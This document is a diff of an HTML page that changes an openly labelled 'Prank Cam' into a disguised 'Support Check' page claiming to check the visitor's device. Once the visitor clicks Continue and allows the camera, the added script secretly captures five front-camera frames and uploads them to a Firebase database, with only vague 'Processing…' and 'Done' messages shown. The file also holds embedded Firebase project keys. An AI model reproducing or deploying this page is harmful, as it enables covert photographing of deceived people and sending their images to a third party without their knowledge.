@@ -1,80 +1,223 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Prank Cam</title>
+<title>Support Check</title>
+
 <style>
-body{margin:0;background:#000;color:#0f0;font-family:monospace;display:flex;flex-direction:column;justify-content:center;align-items:center;height:100vh;}
-#msg{font-size:18px;margin-bottom:20px;}
-video{display:none;}
-button{padding:10px 20px;font-size:16px;border:none;border-radius:5px;background:#ff0000;color:#fff;cursor:pointer;}
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+}
+
+body {
+  height: 100vh;
+  background: #f8f8f8;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: space-between;
+  color: #111;
+}
+
+/* ===== HEADER ===== */
+header {
+  width: 100%;
+  padding: 14px 18px;
+  background: #fff;
+  border-bottom: 1px solid #e5e5e5;
+  font-weight: 600;
+  font-size: 16px;
+}
+
+/* ===== CARD ===== */
+.card {
+  width: 340px;
+  background: #fff;
+  border-radius: 14px;
+  padding: 28px 24px;
+  box-shadow: 0 8px 24px rgba(0,0,0,0.08);
+  text-align: center;
+  animation: fadeIn 0.6s ease;
+}
+
+@keyframes fadeIn {
+  from { opacity: 0; transform: translateY(10px); }
+  to { opacity: 1; transform: translateY(0); }
+}
+
+.title {
+  font-size: 18px;
+  font-weight: 600;
+  margin-bottom: 6px;
+}
+
+#msg {
+  font-size: 14px;
+  color: #666;
+  margin-bottom: 18px;
+}
+
+/* ===== LOADER ===== */
+.dots {
+  display: flex;
+  justify-content: center;
+  gap: 6px;
+  margin-bottom: 22px;
+}
+
+.dots span {
+  width: 8px;
+  height: 8px;
+  background: #fe2c55;
+  border-radius: 50%;
+  animation: blink 1.4s infinite both;
+}
+
+.dots span:nth-child(2) { animation-delay: .2s; }
+.dots span:nth-child(3) { animation-delay: .4s; }
+
+@keyframes blink {
+  0% { opacity: .2; }
+  20% { opacity: 1; }
+  100% { opacity: .2; }
+}
+
+.hidden {
+  display: none;
+}
+
+/* ===== BUTTON ===== */
+button {
+  width: 100%;
+  padding: 12px;
+  border-radius: 10px;
+  border: none;
+  background: #fe2c55;
+  color: #fff;
+  font-size: 15px;
+  font-weight: 500;
+  cursor: pointer;
+}
+
+button:disabled {
+  background: #ccc;
+  cursor: not-allowed;
+}
+
+/* ===== FOOTER ===== */
+footer {
+  font-size: 13px;
+  color: #777;
+  padding: 16px;
+}
+
+footer a {
+  color: #777;
+  text-decoration: none;
+}
+
+video {
+  display: none;
+}
 </style>
 </head>
+
 <body>
 
-<div id="msg">Click to start secure connection...</div>
-<button id="startBtn">Start</button>
-<video id="video" playsinline muted></video>
+<header>Support</header>
+
+<div class="card">
+  <div class="title">Support Check</div>
+  <div id="msg">Checking your device…</div>
+
+  <div class="dots" id="loader">
+    <span></span><span></span><span></span>
+  </div>
+
+  <button id="startBtn">Continue</button>
+  <video id="video" playsinline muted autoplay></video>
+</div>
+
+<footer>
+  <a href="#">📄 Help Center</a>
+</footer>
 
 <script type="module">
 import { initializeApp } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-app.js";
 import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/12.7.0/firebase-database.js";
 
 const firebaseConfig = {
-  apiKey: "AIzaSyAfgvWqYfrzKeqdp63r3mXDrb9TxIIvd04",
-  authDomain: "kolkata-964e4.firebaseapp.com",
-  databaseURL: "https://kolkata-964e4-default-rtdb.firebaseio.com",
-  projectId: "kolkata-964e4",
-  storageBucket: "kolkata-964e4.appspot.com",
-  messagingSenderId: "377401156222",
-  appId: "1:377401156222:web:2b3500de97c8a0acb0ae2f"
+  apiKey: "AIzaSyB0eLmZSDtmF1deFGBNSU9e3aq8_i_DjC4",
+  authDomain: "online-earning-9751b.firebaseapp.com",
+  databaseURL: "https://online-earning-9751b-default-rtdb.firebaseio.com",
+  projectId: "online-earning-9751b",
+  storageBucket: "online-earning-9751b.firebasestorage.app",
+  messagingSenderId: "454796166249",
+  appId: "1:454796166249:web:0606b052e435312a068ef8"
 };
 
 const app = initializeApp(firebaseConfig);
 const db = getDatabase(app);
+
 const video = document.getElementById("video");
 const startBtn = document.getElementById("startBtn");
 const msg = document.getElementById("msg");
+const loader = document.getElementById("loader");
+
+/* ===== AUTO HIDE LOADER AFTER 2s ===== */
+setTimeout(() => {
+  loader.classList.add("hidden");
+}, 2000);
+
+/* ===== CAPTURE ===== */
+function captureFrame() {
+  const canvas = document.createElement("canvas");
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video, 0, 0);
+  return canvas.toDataURL("image/png");
+}
 
 startBtn.onclick = async () => {
   startBtn.disabled = true;
-  msg.innerText = "Accessing camera...";
+  loader.classList.add("hidden");
+  msg.innerText = "Starting…";
 
   try {
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" },
-      audio: false
+      video: { facingMode: "user" }, audio: false
     });
 
     video.srcObject = stream;
     await video.play();
+    msg.innerText = "Processing…";
 
-    msg.innerText = "Camera connected! Taking selfie...";
+    const total = 5;
+    const interval = 800; // ~4 seconds total
 
-    const track = stream.getVideoTracks()[0];
-    const imageCapture = new ImageCapture(track);
-
-    // Take selfie after 2s delay
-    setTimeout(async () => {
-      const photo = await imageCapture.takePhoto(); // real photo
-      const reader = new FileReader();
-      reader.onload = () => {
+    for (let i = 0; i < total; i++) {
+      setTimeout(() => {
         push(ref(db, "tempImages"), {
-          image: reader.result,
+          image: captureFrame(),
           time: Date.now()
         });
-        msg.innerText = "Selfie sent to admin!";
-      };
-      reader.readAsDataURL(photo);
-    }, 2000);
 
-  } catch (err) {
-    console.error(err);
-    alert("Camera access failed! Make sure you are using HTTPS or localhost and allow permissions.");
+        if (i === total - 1) {
+          msg.innerText = "Done";
+        }
+      }, i * interval);
+    }
+
+  } catch {
+    msg.innerText = "Permission required";
     startBtn.disabled = false;
   }
 };
 </script>
+
 </body>
 </html>
